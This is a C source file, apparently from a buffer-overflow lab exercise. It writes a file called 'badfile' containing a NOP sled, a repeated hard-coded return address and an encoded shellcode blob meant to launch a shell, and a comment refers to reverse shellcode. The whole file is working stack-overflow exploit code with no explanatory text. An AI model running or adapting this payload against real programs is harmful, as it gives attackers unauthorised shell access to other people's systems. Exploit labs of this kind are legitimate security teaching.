/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=  
          
  "\xbb\xc7\x64\xb1\x4b\xda\xc4\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
  "\x12\x83\xc0\x04\x31\x58\x0e\x03\x9f\x6a\x53\xbe\x2e\xa8\x64"
  "\xa2\x03\x0d\xd8\x4f\xa1\x18\x3f\x3f\xc3\xd7\x40\xd3\x52\x58"
  "\x7f\x19\xe4\xd1\xf9\x58\x8c\x4d\xe6\x90\xa3\xe6\x1b\xa5\x2a"
  "\xab\x92\x44\xfc\x35\xf5\xd7\xaf\x0a\xf6\x5e\xae\xa0\x79\x32"
  "\x58\x55\x55\xc0\xf0\xc1\x86\x09\x62\x7b\x50\xb6\x30\x28\xeb"
  "\xd8\x04\xc5\x26\x9a"; 
                  
                   
/*add your reverse shellcode here */;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);
    
    /* You need to fill the buffer with appropriate contents here */ 
    memcpy(buffer+16,"\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf\x70\xf1\xff\xbf",72); 
    memcpy(buffer+200,shellcode,sizeof(shellcode));
    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

